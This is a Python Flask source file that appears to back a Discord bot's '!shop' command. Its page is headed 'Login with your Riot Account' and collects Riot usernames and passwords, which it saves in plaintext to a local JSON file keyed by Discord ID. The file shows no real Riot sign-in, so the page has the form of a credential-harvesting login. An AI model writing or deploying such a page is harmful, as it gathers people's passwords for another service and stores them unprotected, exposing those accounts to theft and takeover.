from flask import Flask, request, render_template_string, redirect, url_for
import json
import os

app = Flask(__name__)

USERS_FILE = "users.json"

def save_user(discord_id, username, password):
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            users = json.load(f)
    else:
        users = {}
    users[discord_id] = {"username": username, "password": password}
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)

@app.route("/login")
def login():
    discord_id = request.args.get("discord_id")
    if not discord_id:
        return "Missing Discord ID", 400
    return render_template_string("""
        <h2>Login with your Riot Account</h2>
        <form action="{{ url_for('submit') }}" method="post">
            <input type="hidden" name="discord_id" value="{{ discord_id }}">
            <label>Riot Username: <input name="username"></label><br>
            <label>Riot Password: <input name="password" type="password"></label><br>
            <button type="submit">Login</button>
        </form>
    """, discord_id=discord_id)

@app.route("/submit", methods=["POST"])
def submit():
    discord_id = request.form["discord_id"]
    username = request.form["username"]
    password = request.form["password"]
    save_user(discord_id, username, password)
    return redirect(url_for("success"))

@app.route("/success")
def success():
    return "<h2>Login successful! You can return to Discord and use !shop.</h2>"

if __name__ == "__main__":
    app.run(port=5000) 